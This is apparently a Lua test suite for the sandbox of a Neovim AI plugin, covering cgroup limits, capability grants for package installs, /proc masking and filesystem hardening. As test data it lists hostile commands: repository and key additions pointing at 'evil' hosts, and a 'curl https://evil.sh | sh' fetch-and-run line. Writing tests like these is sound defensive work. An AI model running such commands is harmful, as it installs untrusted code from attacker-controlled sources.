    t.true_(l.memory_bytes > 0, "应推导内存上限")
    t.true_(l.pids > 0, "应推导 PID 上限")
    t.true_(l.cpu_max > 0, "应推导 CPU 配额")
    with_config({ tools = { sandbox = { limits = { memory_bytes = 111, pids = 7 } } } }, function()
      local s = cgroup.resolve_limits()
      t.eq(111, s.memory_bytes, "静态内存优先")
      t.eq(7, s.pids, "静态 PID 优先")
      t.true_(s.cpu_max > 0, "CPU 配额无静态项，仍应按内部预算推导")
    end)
    with_config({ tools = { sandbox = { limits = { dynamic = false } } } }, function()
      t.true_(not cgroup.limits_configured(), "dynamic=false 且无静态限制时不应启用")
    end)
  end)

  it("资源限制：全局 CPU 预算封顶并发总量，单任务配额不超预算", function(t)
    local cgroup = require("NeoAI.sandbox.execution.cgroup")
    local host = require("NeoAI.utils.host")
    local g = cgroup.global_cpu_max()
    t.true_(g >= 1, "全局预算至少 1 核")
    t.true_(g <= host.core_budget(), "全局预算应不超内部 max(1, 核数-2)")
    t.eq(g * 100000, cgroup.effective_cpu_max((g + 5) * 100000), "单任务配额应被全局预算封顶")
    t.eq(100000, cgroup.effective_cpu_max(100000), "低于预算的单任务配额保持")
    t.eq(0, cgroup.effective_cpu_max(0), "0 表示不限制")
  end)

  it("资源限制：容器 cgroup 配额参与推导（不超容器实际可用）", function(t)
    local cgroup = require("NeoAI.sandbox.execution.cgroup")
    -- 解析：子 cgroup 为 max 时沿父链向上取最近有限值。
    local files = {
      ["/sys/fs/cgroup/docker/abc/memory.max"] = "max\n",
      ["/sys/fs/cgroup/docker/abc/cpu.max"] = "max 100000\n",
      ["/sys/fs/cgroup/docker/memory.max"] = tostring(3 * 1024 * 1024 * 1024) .. "\n",
      ["/sys/fs/cgroup/docker/cpu.max"] = "250000 100000\n",
    }
    local q = cgroup.cgroup_quota({
      rel = "/docker/abc", base = "/sys/fs/cgroup",
      reader = function(p) return files[p] end,
    })
    t.eq(3 * 1024 * 1024 * 1024, q.memory_bytes, "应取最近父域有限 memory.max")
    t.eq(2, q.cpu_cores, "cpu.max 250000/100000 应向下取整为 2 核")
    -- 全部为 max（宿主直跑）：无配额。
    local q2 = cgroup.cgroup_quota({
      rel = "/", base = "/sys/fs/cgroup",
      reader = function(_) return "max\n" end,
    })
    t.eq(nil, q2.memory_bytes, "无限制时不报告内存配额")
    t.eq(nil, q2.cpu_cores, "无限制时不报告 CPU 配额")
    -- 不变量：存在配额时，解析限制不得超配额。
    local real = cgroup.cgroup_quota()
    local l = cgroup.resolve_limits()
    if real.memory_bytes then
      t.true_(l.memory_bytes <= real.memory_bytes, "沙箱内存上限不得超容器配额")
    end
    if real.cpu_cores then
      t.true_(l.cpu_max <= real.cpu_cores * 100000, "沙箱 CPU 配额不得超容器配额")
      t.true_(cgroup.global_cpu_max() <= real.cpu_cores, "全局 CPU 预算不得超容器配额")
    end
  end)

  it("包安装：提取管理器与包名（按安装命令合并）", function(t)
    local privilege = require("NeoAI.sandbox.execution.privilege")
    local info = assert(privilege.package_info("npm install express lodash"))
    t.not_nil(info, "应识别 npm 安装")
    t.eq("npm", info.manager, "管理器")
    t.eq("npm:express,lodash", info.key, "合并键")
    local pip = assert(privilege.package_info("pip3 install --user requests flask"))
    t.not_nil(pip, "应识别 pip 安装")
    t.eq("pip3", pip.manager, "管理器")
    t.eq("pip3:requests,flask", pip.key, "应跳过 flag 提取包名")
    local ci = assert(privilege.package_info("npm ci"))
    t.not_nil(ci, "应识别无包名的安装")
    t.eq("npm:*", ci.key, "无显式包名时用通配键")
    t.eq(nil, privilege.package_info("echo hello"), "非包安装返回 nil")
  end)

  it("包安装：敏感安装判定（改动第三方软件源/密钥）", function(t)
    local privilege = require("NeoAI.sandbox.execution.privilege")
    -- 普通安装：安全
    for _, cmd in ipairs({ "apt-get install -y curl", "pip install requests", "npm install express",
      "cargo install ripgrep", "sudo apt-get update" }) do
      t.false_(privilege.package_sensitive(cmd), "普通安装不应视为敏感: " .. cmd)
    end
    -- 改动第三方软件源 / 密钥：敏感
    for _, cmd in ipairs({
      "add-apt-repository ppa:foo/bar",
      "apt-key add key.gpg",
      "echo 'deb http://evil/x' > /etc/apt/sources.list.d/evil.list",
      "dnf config-manager --add-repo https://evil/repo",
      "rpm --import https://evil/key.asc",
      "pip install --index-url https://evil/simple foo",
      "npm install --registry https://evil foo",
      "gem sources --add https://evil",
      "gpg --import evil.key",
      "brew tap evil/foo",
    }) do
      t.true_(privilege.package_sensitive(cmd), "应视为敏感安装: " .. cmd)
    end
    t.false_(privilege.package_sensitive("echo hello"), "非包命令不敏感")
    t.false_(privilege.package_sensitive(nil), "nil 不敏感")
  end)

  it("包安装：含包管理器的命令加回窄 capability（含链式）", function(t)
    local privilege = require("NeoAI.sandbox.execution.privilege")
    local r = privilege.resolve(1, { tier = 1, package = true, package_all = true })
    t.true_(r.ok, "应解析成功")
    t.true_(vim.tbl_contains(r.privileges.cap_add, "CAP_DAC_OVERRIDE"), "应加回 DAC_OVERRIDE")
    t.true_(vim.tbl_contains(r.privileges.cap_add, "CAP_CHOWN"), "应加回 CHOWN")
    t.true_(not vim.tbl_contains(r.privileges.cap_add, "CAP_MKNOD"), "默认不应含 CAP_MKNOD（seccomp 另行硬拦设备节点）")
    -- 链式命令（含非包管理器段）同样加回：apt 需 CHOWN/SETUID 才能 chown/setuid 到 _apt；
    -- 写入仍全部进 overlay 暂存、敏感路径由遮蔽挂载保护，不扩大宿主面。
    local r2 = privilege.resolve(1, { tier = 1, package = true, package_all = false })
    t.true_(vim.tbl_contains(r2.privileges.cap_add, "CAP_DAC_OVERRIDE"), "链式包命令应加回")
    -- 非包安装不按 packages.cap_add 加回包管理专属能力（DAC_OVERRIDE/SETUID/SETGID 属档位基线，
    -- 始终存在以支持沙箱内降权）；CHOWN 等仍不授予。
    local r3 = privilege.resolve(1, { tier = 1, package = false, package_all = false })
    t.true_(not vim.tbl_contains(r3.privileges.cap_add, "CAP_CHOWN"), "非包安装不应加回 CAP_CHOWN")
    t.true_(vim.tbl_contains(r3.privileges.cap_add, "CAP_SETUID"), "SETUID 属档位基线（沙箱内降权）")
  end)

  it("加固：基线 CAP_DAC_OVERRIDE 使 root 载荷可访问他人属主 0700 目录", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    local privilege = require("NeoAI.sandbox.execution.privilege")
    local r0 = privilege.resolve(0, { tier = 0 })
    t.true_(r0.ok and vim.tbl_contains(r0.privileges.cap_add, "CAP_DAC_OVERRIDE"),
      "T0 基线应含 CAP_DAC_OVERRIDE")
    local r1 = privilege.resolve(1, { tier = 1, network = true })
    t.true_(r1.ok and vim.tbl_contains(r1.privileges.cap_add, "CAP_DAC_OVERRIDE"),
      "T1 基线应含 CAP_DAC_OVERRIDE")
    if runtime.backend() ~= "bwrap" or vim.uv.getuid() ~= 0 then return end
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local base = vim.fn.stdpath("cache") .. "/neoai_perm_test"
    vim.fn.delete(base, "rf")
    fs.ensure_dir(base)
    local sub = base .. "/owned_0700"
    fs.ensure_dir(sub)
    fs.write_file(sub .. "/secret.txt", "ok\n")
    vim.fn.system({ "chown", "-R", "65534:65534", base })
    vim.fn.system({ "chmod", "0700", sub })
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done, out = false, ""
      require("NeoAI.tools").execute("run_command", {
        command = "cat " .. sub .. "/secret.txt", description = "t",
      }, {}):then_(function(res) out = tostring(res); done = true end, function(e)
        out = "ERR " .. tostring(e and e.message or e); done = true
      end)
      t.true_(vim.wait(20000, function() return done end), "命令应完成")
      t.matches("ok", tostring(out), "root 载荷应能读取他人属主 0700 目录（实际: " .. tostring(out) .. "）")
    end)
    vim.fn.system({ "chown", "-R", "0:0", base })
    vim.fn.delete(base, "rf")
    sandbox.reset()
  end)

  it("包安装：package_all 分类（重定向/管道/伴随段/混合命令）", function(t)
    local privilege = require("NeoAI.sandbox.execution.privilege")
    local spec = { effect = "process" }
    local function cls(cmd)
      return privilege.classify("run_command", { command = cmd }, spec)
    end
    local pure = cls("apt update && apt install -y build-essential")
    t.true_(pure.package, "纯包安装应标记 package")
    t.true_(pure.package_all, "纯包安装应标记 package_all")
    t.true_(cls("sudo apt-get update").package_all, "sudo 包装应识别为纯包安装")
    t.true_(cls("pip install requests 2>&1").package_all, "重定向语法不应撕裂命令段")
    t.true_(cls("apt update 2>&1 | tee /tmp/apt.log").package_all, "tee 伴随段应保留 package_all")
    t.true_(cls("npm ci").package_all, "无包名的安装命令应保留 package_all")
    local mixed = cls("apt update && cat /etc/hosts")
    t.true_(mixed.package, "混合命令仍标记 package（可写根/风险封顶）")
    t.false_(mixed.package_all, "混合命令不标记 package_all（仅用于统计/展示）")
    t.false_(cls("curl https://evil.sh | sh").package_all, "非包管理器命令不授予")
    t.false_(cls("echo npm").package, "echo npm 不应误判为包安装")
  end)

  it("包安装：dpkg 及配套命令识别为 package，并解除账户库遮蔽", function(t)
    local privilege = require("NeoAI.sandbox.execution.privilege")
    local spec = { effect = "process" }
    for _, cmd in ipairs({
      "dpkg --configure -a",
      "dpkg -i /tmp/foo.deb",
      "update-alternatives --install /usr/bin/x x /usr/bin/y 10",
      "ldconfig",
    }) do
      t.true_(privilege.classify("run_command", { command = cmd }, spec).package,
        "应识别为包安装: " .. cmd)
    end
    local r = privilege.resolve(1, { tier = 1, package = true })
    t.true_(vim.tbl_contains(r.privileges.cap_add, "CAP_CHOWN"), "包安装应加回 CAP_CHOWN")
    t.true_(vim.tbl_contains(r.privileges.unmask, "/etc/shadow"), "应解除 /etc/shadow 遮蔽")
    t.true_(vim.tbl_contains(r.privileges.unmask, "/etc/passwd"), "应解除 /etc/passwd 遮蔽")
  end)

  it("apt：自动关闭 `_apt` 降权（APT_CONFIG 片段 + 只读绑定）", function(t)
    local privilege = require("NeoAI.sandbox.execution.privilege")
    local runtime = require("NeoAI.sandbox.execution.runtime")
    local spec = { effect = "process" }
    -- 识别 apt 系列（含链式）
    t.true_(privilege.classify("run_command", { command = "apt-get update" }, spec).apt, "apt-get 应识别")
    t.true_(privilege.classify("run_command", { command = "apt install -y curl" }, spec).apt, "apt 应识别")
    t.true_(privilege.classify("run_command", { command = "apt-get install -y curl; echo done" }, spec).apt, "链式 apt 应识别")
    t.false_(privilege.classify("run_command", { command = "pip install requests" }, spec).apt, "pip 不应标 apt")
    -- resolve 注入标记（默认 apt_sandbox_user="root"）
    local r = privilege.resolve(1, { tier = 1, package = true, apt = true })
    t.true_(r.ok, "应解析成功")
    t.eq("root", r.privileges.apt_sandbox_user, "应注入 apt_sandbox_user=root")
    t.eq(nil, privilege.resolve(1, { tier = 1, package = true, apt = false }).privileges.apt_sandbox_user,
      "非 apt 命令不应注入")
    -- 环境：APT_CONFIG 指向沙箱内挂载点
    t.eq("/tmp/.apt.conf", runtime.sandbox_env({ apt_sandbox_user = "root" }).APT_CONFIG, "应设置 APT_CONFIG")
    t.eq(nil, runtime.sandbox_env({}).APT_CONFIG, "无标记时不设置 APT_CONFIG")
    -- 前缀：包含到该挂载点的只读绑定
    if runtime.backend() == "bwrap" then
      local joined = table.concat(runtime.process_prefix({ cwd = "/tmp", privileges = r.privileges }) or {}, " ")
      t.true_(joined:find("/tmp/.apt.conf", 1, true) ~= nil, "应绑定到 APT_CONFIG 路径")
    end
    -- 配置 "_apt" 时保留 apt 默认行为
    with_config({ tools = { sandbox = { packages = { apt_sandbox_user = "_apt" } } } }, function()
      t.eq(nil, privilege.resolve(1, { tier = 1, package = true, apt = true }).privileges.apt_sandbox_user,
        "配置 _apt 时不注入")
    end)
  end)

  it("沙箱进程环境注入 NEOAI_SANDBOX 标记，供嵌套 NeoAI 跳过自动外部操作", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    local env = runtime.sandbox_env(nil)
    t.eq("1", env.NEOAI_SANDBOX, "sandbox_env 应注入 NEOAI_SANDBOX=1")
  end)

  it("权限档位：docker unmask 仅对 docker 命令生效", function(t)
    local privilege = require("NeoAI.sandbox.execution.privilege")
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local sock = dir .. "/docker.sock"
    fs.write_file(sock, "")
    with_config({ tools = { sandbox = { docker = { mode = "controlled", socket = sock } } } }, function()
      local t1 = privilege.resolve(1, { tier = 1, network = true })
      t.true_(t1.ok, "T1 应可解析")
      t.eq(0, #t1.privileges.unmask, "非 docker 的 T1 命令不应解除 docker.sock 遮蔽")
      local d = privilege.resolve(1, { tier = 1, docker = true, network = true })
      t.true_(d.ok, "docker 的 T1 应可解析")
      t.true_(vim.tbl_contains(d.privileges.unmask, "/run/docker.sock"), "docker 命令应解除 socket 遮蔽")
      t.true_(vim.tbl_contains(d.privileges.unmask, "/var/run/docker.sock"), "应同时覆盖 /var/run 路径")
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("包安装：可写根包含额外状态目录（overlay 暂存）", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local wrapper = require("NeoAI.sandbox.execution.wrapper")
    local dir = (vim.fn.stdpath("cache") .. "/NeoAI/tests_pkg_root"):gsub("/+$", "")
    vim.fn.mkdir(dir, "p")
    local base = vim.fn.tempname()
    vim.fn.mkdir(base, "p")
    -- read_all=false：旧多根逻辑，额外可写根应显式出现在 specs 中。
    with_config({ tools = { sandbox = { read_all = false } } }, function()
      local specs = wrapper.build_overlay_specs("/tmp", base, { dir })
      local found = false
      for _, s in ipairs(specs) do if s.root == dir then found = true end end
      t.true_(found, "应包含额外可写根 " .. dir)
    end)
    -- read_all=true（默认）：整机根 overlay 覆盖所有绝对路径（含额外根）。
    with_config({ tools = { sandbox = { read_all = true } } }, function()
      local specs = wrapper.build_overlay_specs(dir, base, { dir })
      local has_root = false
      for _, s in ipairs(specs) do if s.root == "/" then has_root = true end end
      t.true_(has_root, "整机根 overlay 应覆盖额外可写根")
    end)
    pcall(vim.fn.delete, dir, "rf")
    pcall(vim.fn.delete, base, "rf")
  end)

  it("包安装暂存：重启后仍可读（rehydrate 待审/已批准）", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    local exec = require("NeoAI.sandbox.execution.exec")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      -- 暂存根必须可被捕获：不能位于 `<cache>/NeoAI`（自身运行时，捕获阶段整棵排除）。
      local dir = vim.fn.tempname()
      vim.fn.mkdir(dir, "p")
      local real_file = dir .. "/node_modules/pkg/index.js"
      vim.fn.mkdir(vim.fn.fnamemodify(real_file, ":h"), "p")
      pcall(os.remove, real_file)
      local done = false
      exec.run({ "bash", "-c", "echo PKG > " .. real_file }, {
        name = "pkg", writable_roots = { dir }, network = false, timeout_ms = 20000,
      }):then_(function() done = true end, function() done = true end)
      t.true_(vim.wait(20000, function() return done end, 20), "子进程应完成")
      -- 模拟重启：shutdown 清空暂存目录，init 从持久化候选重建。
      sandbox.shutdown()
      sandbox.init()
      local staged = require("NeoAI.sandbox.execution.candidate").read_path(real_file)
      t.not_nil(staged, "重启后应能从候选重建暂存副本")
      local f = io.open(assert(staged))
      local content = f and f:read("*a") or ""
      if f then f:close() end
      t.matches("PKG", content, "重启后暂存内容应保留")
      pcall(vim.fn.delete, dir, "rf")
    end)
  end)

  it("工具子进程：共享目录位于沙箱存储之外（不被强制遮蔽）", function(t)
    local exec = require("NeoAI.sandbox.execution.exec")
    local store = require("NeoAI.sandbox.state.store")
    local sr = exec.shared_root()
    local root = (store.root() or ""):gsub("/+$", "")
    t.true_(root ~= "" and sr ~= root and sr:sub(1, #root + 1) ~= root .. "/",
      "共享目录不应位于沙箱存储内")
  end)

  it("加固：隐藏 /proc/cmdline 与 /proc/version", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local prefix = runtime.process_prefix({ cwd = "/tmp" })
    t.not_nil(prefix, "应能构造前缀")
    local cmd = {}
    for _, v in ipairs(assert(prefix)) do cmd[#cmd + 1] = v end
    for _, v in ipairs({ "/bin/sh", "-c",
      "echo \"cmdline=[$(cat /proc/cmdline)]\"; echo \"version=[$(cat /proc/version)]\"",
    }) do cmd[#cmd + 1] = v end
    local out = vim.fn.system(cmd)
    t.true_(out:find("cmdline=%[%]", 1) ~= nil, "cmdline 应为空，实际: " .. tostring(out))
    t.true_(out:find("version=%[%]", 1) ~= nil, "version 应为空，实际: " .. tostring(out))
    t.true_(out:find("BOOT_IMAGE", 1, true) == nil, "不应泄露宿主内核命令行")
  end)

  it("加固：强制遮蔽危险全局 sysctl（core_pattern/modprobe），用户不可移除", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    local masks = runtime.mandatory_proc_masks()
    t.true_(vim.tbl_contains(masks, "/proc/sys/kernel/core_pattern"), "应含 core_pattern")
    t.true_(vim.tbl_contains(masks, "/proc/sys/kernel/modprobe"), "应含 modprobe")
    t.true_(vim.tbl_contains(masks, "/proc/sysrq-trigger"), "应含 sysrq-trigger")
    t.true_(vim.tbl_contains(masks, "/proc/kcore"), "应含 kcore")
    t.true_(vim.tbl_contains(masks, "/proc/vmallocinfo"), "应含 vmallocinfo")
    t.true_(vim.tbl_contains(masks, "/proc/keys"), "应含 keys")
    -- 用户把 hide_proc_paths 设为空表，强制项仍在
    with_config({ tools = { sandbox = { hide_proc_paths = {} } } }, function()
      local paths = runtime.proc_mask_paths()
      t.true_(vim.tbl_contains(paths, "/proc/sys/kernel/core_pattern"), "空配置下仍应含 core_pattern")
      t.true_(vim.tbl_contains(paths, "/proc/sys/kernel/modprobe"), "空配置下仍应含 modprobe")
      local joined = table.concat(runtime.append_hidden_proc({}), " ")
      t.true_(joined:find("/proc/sys/kernel/core_pattern", 1, true) ~= nil, "argv 应遮蔽 core_pattern")
      t.true_(joined:find("/proc/sys/kernel/modprobe", 1, true) ~= nil, "argv 应遮蔽 modprobe")
    end)
    -- 整个 /proc/sys 只读绑定应出现在 bwrap 前缀中
    if runtime.backend() == "bwrap" then
      local pre = table.concat(assert(runtime.process_prefix({ cwd = "/tmp" })), " ")
      t.true_(pre:find("--ro-bind /proc/sys /proc/sys", 1, true) ~= nil, "前缀应只读绑定 /proc/sys")
    end
  end)

  it("加固：沙箱内无法写 core_pattern（只读遮蔽 → EROFS）", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local prefix = runtime.process_prefix({ cwd = "/tmp" })
    t.not_nil(prefix, "应能构造前缀")
    local cmd = {}
    for _, v in ipairs(assert(prefix)) do cmd[#cmd + 1] = v end
    -- `: > file` 只做 open(O_WRONLY) 不写内容：可写则无副作用，只读则 EROFS。
    -- 放进子 shell 重定向，避免 dash 因重定向失败而终止整条命令。
    for _, v in ipairs({ "/bin/sh", "-c",
      "if ( : > /proc/sys/kernel/core_pattern ) 2>/dev/null; then echo WRITABLE; else echo READONLY; fi; "
      .. "if ( : > /proc/sys/kernel/modprobe ) 2>/dev/null; then echo WRITABLE; else echo READONLY; fi; "
      .. "if ( : > /proc/sys/kernel/randomize_va_space ) 2>/dev/null; then echo WRITABLE; else echo READONLY; fi; "
      .. "if ( : > /proc/sys/net/ipv4/ip_forward ) 2>/dev/null; then echo WRITABLE; else echo READONLY; fi; "
      .. "if ( : > /proc/sys/vm/swappiness ) 2>/dev/null; then echo WRITABLE; else echo READONLY; fi",
    }) do cmd[#cmd + 1] = v end
    local out = vim.fn.system(cmd)
    t.true_(out:find("WRITABLE", 1, true) == nil, "全局 sysctl 不应可写，实际: " .. tostring(out))
    t.true_(out:find("READONLY", 1, true) ~= nil, "应为只读（EROFS），实际: " .. tostring(out))
    -- 只读绑定不应破坏读取
    local cmd2 = {}
    for _, v in ipairs(assert(prefix)) do cmd2[#cmd2 + 1] = v end
    for _, v in ipairs({ "/bin/sh", "-c", "cat /proc/sys/kernel/randomize_va_space" }) do cmd2[#cmd2 + 1] = v end
    local out2 = vim.fn.system(cmd2)
    t.matches("%d", out2, "只读后仍应能读取 sysctl，实际: " .. tostring(out2))
  end)

  it("加固：/etc/resolv.conf 净化暴露（剥离 search/domain）", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local prefix = runtime.process_prefix({ cwd = "/tmp" })
    t.not_nil(prefix, "应能构造前缀")
    local cmd = {}
    for _, v in ipairs(assert(prefix)) do cmd[#cmd + 1] = v end
    for _, v in ipairs({ "/bin/sh", "-c",
      "if grep -Eq '^(search|domain)[[:space:]]' /etc/resolv.conf 2>/dev/null; then echo LEAK_SEARCH; fi; "
      .. "if grep -q '^nameserver' /etc/resolv.conf 2>/dev/null; then echo HAS_NS; fi; echo DONE",
    }) do cmd[#cmd + 1] = v end
    local out = vim.fn.system(cmd)
    t.true_(out:find("LEAK_SEARCH", 1, true) == nil, "不应泄露 search/domain，实际: " .. tostring(out))
    local host_has_ns = false
    local hf = io.open("/etc/resolv.conf", "r")
    if hf then
      local c = hf:read("*a")
      hf:close()
      host_has_ns = c:find("nameserver", 1, true) ~= nil
    end
    if host_has_ns then
      t.true_(out:find("HAS_NS", 1, true) ~= nil, "应保留 nameserver 行，实际: " .. tostring(out))
    end
    t.true_(out:find("DONE", 1, true) ~= nil, "命令应完成")
  end)

  it("加固：resolv_conf 可配 hide / passthrough", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    with_config({ tools = { sandbox = { resolv_conf = "hide" } } }, function()
      local joined = table.concat(runtime.append_readonly({}), " ")
      t.true_(joined:find("/etc/resolv.conf", 1, true) == nil, "hide 时不应暴露 resolv.conf")
    end)
    if vim.uv.fs_stat("/etc/resolv.conf") then
      with_config({ tools = { sandbox = { resolv_conf = "passthrough" } } }, function()
        local joined = table.concat(runtime.append_readonly({}), " ")
        t.true_(joined:find("--ro-bind /etc/resolv.conf /etc/resolv.conf", 1, true) ~= nil,
          "passthrough 应原样暴露 resolv.conf")
      end)
    end
  end)

  it("加固：/run 为每会话私有可写根（postinst 的 adduser 锁文件可用）", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    t.true_(vim.tbl_contains(runtime.tmpfs_roots(), "/run"), "tmpfs_roots 应包含 /run")
    local joined = table.concat(runtime.process_prefix({ cwd = "/tmp" }) or {}, " ")
    -- 以 bind（会话私有目录）或 tmpfs 覆盖为可写（否则整机 overlay 下 /run 只读）
    local writable = joined:find("--tmpfs /run", 1, true) ~= nil
      or joined:match("--bind [^ ]+ /run") ~= nil
    t.true_(writable, "应以 bind/tmpfs 覆盖 /run 为可写")
  end)

  it("写日志：eBPF 观测到命令写入/删除路径（供 capture 增量）", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local observer = require("NeoAI.sandbox.observe.observer")
    if observer.backend() ~= "ebpf" or not observer.writes_available() then return end
    local sandbox = require("NeoAI.sandbox")
    local p = "/root/neoai_journal_probe.txt"
    pcall(os.remove, p)
    with_config({ tools = { sandbox = { observe = {
      enabled = true, backend = "ebpf", wait_ready_ms = 3000, prewarm = false,
    } } } }, function()
      sandbox.reset()
      local done, ctx = false, {}
      require("NeoAI.tools").execute("run_command", {
        command = "printf jj > " .. p, description = "t", timeout_ms = 30000,
      }, ctx):then_(function() done = true end, function() done = true end)
      t.true_(vim.wait(30000, function() return done end, 20), "命令应完成")
      t.true_(ctx._observed_writes and ctx._observed_writes[p] == true,
        "写集应含目标文件: " .. vim.inspect(ctx._observed_writes))
    end)
    pcall(os.remove, p)
    sandbox.reset()
  end)

  it("加固：/tmp、/var/tmp 为每会话私有 tmpfs（不暴露宿主残留）", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    local residue = "/tmp/neoai_residue_probe.txt"
    fs.write_file(residue, "HOST_RESIDUE\n")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "cat /tmp/neoai_residue_probe.txt 2>/dev/null && echo LEAK_RESIDUE || echo NO_RESIDUE; "
          .. "stat -c '%a' /tmp; stat -c '%a' /var/tmp 2>/dev/null || echo NO_VARTMP",
        description = "t",
      }, {}):then_(function(r)
        local s = tostring(r)
        t.true_(s:find("LEAK_RESIDUE", 1, true) == nil, "沙箱 /tmp 不应看到宿主残留，实际: " .. s)
        t.matches("NO_RESIDUE", s, "宿主残留应不可见")
        t.matches("1777", s, "/tmp 应为 1777")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(15000, function() return done end), "应完成")
    end)
    vim.fn.chdir(prev)
    pcall(fs.delete_file, residue)
    vim.fn.delete(dir, "rf")
  end)

  it("加固：遮蔽目录（其他一级条目/隐藏文件）且 cwd 子树豁免", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local fs = require("NeoAI.utils.fs")
    local home = "/root/neoai_home_mask_test"
    local proj = home .. "/proj"
    fs.ensure_dir(proj)
    fs.ensure_dir(home .. "/other")
    fs.write_file(home .. "/secret.txt", "s")
    fs.write_file(home .. "/.bash_history", "h")
    with_config({ tools = { sandbox = { read_all = false, mask_dirs_enabled = true, mask_dirs = { "/home", "/root" } } } }, function()
      local prefix = runtime.process_prefix({ cwd = proj })
      t.not_nil(prefix, "应能构造前缀")
      local joined = table.concat(assert(prefix), " ")
      t.true_(joined:find("--ro-bind /root /root", 1, true) ~= nil, "cwd 所在作用域应只读暴露")
      t.true_(joined:find("--tmpfs " .. home .. "/other", 1, true) ~= nil, "作用域下其他目录应遮蔽")
      t.true_(joined:find("--bind /dev/null " .. home .. "/.bash_history", 1, true) ~= nil, "隐藏文件应遮蔽")
      t.true_(joined:find("--tmpfs " .. proj, 1, true) == nil, "cwd 子树不应被遮蔽")
      -- 遮蔽条目查询（供审批）：命中兄弟目录，cwd 子树与祖先链不命中
      t.eq(home .. "/other", runtime.mask_entry(home .. "/other/x.txt", proj), "应返回遮蔽条目")
      t.nil_(runtime.mask_entry(proj .. "/a.txt", proj), "cwd 子树不应命中")
      t.nil_(runtime.mask_entry(home, proj), "祖先链不应命中")
      -- 审批放行：unmask 该条目后不再遮蔽（含后代）
      local unmasked = table.concat(assert(runtime.process_prefix({
        cwd = proj, privileges = { tier = 0, unmask = { home .. "/other" } },
      })), " ")
      t.true_(unmasked:find("--tmpfs " .. home .. "/other", 1, true) == nil, "获批条目应解除遮蔽")
    end)
    with_config({ tools = { sandbox = { read_all = false, mask_dirs_enabled = false } } }, function()
      local joined = table.concat(assert(runtime.process_prefix({ cwd = proj })), " ")
      t.true_(joined:find("--ro-bind /root /root", 1, true) == nil, "关闭后不应额外暴露 home")
      t.true_(joined:find("--tmpfs " .. home .. "/other", 1, true) == nil, "关闭后不应遮蔽 home")
    end)
    vim.fn.delete(home, "rf")
  end)

end)
